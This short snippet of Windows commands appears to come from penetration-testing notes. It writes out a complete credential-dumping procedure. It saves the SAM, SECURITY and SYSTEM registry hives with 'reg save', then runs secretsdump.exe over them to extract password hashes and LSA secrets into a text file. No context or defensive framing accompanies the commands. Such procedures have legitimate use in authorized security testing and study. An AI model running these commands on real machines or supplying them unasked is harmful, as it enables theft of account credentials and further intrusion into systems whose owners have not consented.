reg save hklm\sam .\sam.save
reg save hklm\security .\security.save
reg save hklm\system .\system.save
secretsdump.exe -sam sam.save -security security.save -system system.save LOCAL >> secretsdump_pass.txt